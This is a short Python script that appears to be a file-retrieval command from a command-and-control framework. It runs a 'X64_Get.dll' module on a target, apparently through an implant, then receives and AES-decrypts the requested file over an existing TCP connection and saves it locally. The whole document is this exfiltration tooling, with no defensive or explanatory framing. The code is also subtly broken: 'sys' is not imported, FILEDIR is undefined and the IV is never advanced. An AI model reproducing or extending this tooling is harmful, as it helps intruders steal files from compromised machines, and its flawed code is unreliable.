import eternalhush as eh
from additional import clingyspider
import os

FILEINFO = {
    "part_count": eh.SHORT,
    "file_size": eh.SHORT,
    "padding": 12
}

FILEPART = {
    "part_length": eh.SHORT,
    "file_part": 4094
}

def main(args):
    source_file = args[0]
    dest_file = args[1]
    
    clingyspider.ExecuteModule(os.path.join(FILEDIR, "X64_Get.dll"), args=[source_file])
    
    connection = int(eh.ui.GetEnv("CLSP_CONNECTION"))
    session_key = bytearray.fromhex(eh.ui.GetEnv("CLSP_KEY"))
    next_iv = bytearray.fromhex(eh.ui.GetEnv("CLSP_IV"))
    
    file_info_encrypted = eh.net.TcpRecv(connection, 16)
    file_info = eh.data.Struct(FILEINFO)
    file_info.from_bytes(eh.crypto.DecryptAesData(session_key, next_iv, file_info_encrypted))
   
    file_size = file_info.file_size.get(int)
    part_count = file_info.part_count.get(int)

    file_buffer = b""
    for i in range(part_count):
        filepart_encrypted = eh.net.TcpRecv(connection, 4096)
        filepart = eh.data.Struct(FILEPART)
        filepart.from_bytes(eh.crypto.DecryptAesData(session_key, next_iv, filepart_encrypted))
        
        part_size = filepart.part_length.get(int)
        if part_size != 4094:
            file_buffer += filepart.file_part.get()[:part_size]
        else:
            file_buffer += filepart.file_part.get()
    
    try:
        with open(dest_file, "wb+") as f:
            f.write(file_buffer)

    except IOError:
        eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
        return  
    
if __name__ == "__main__":
    main(sys.argv)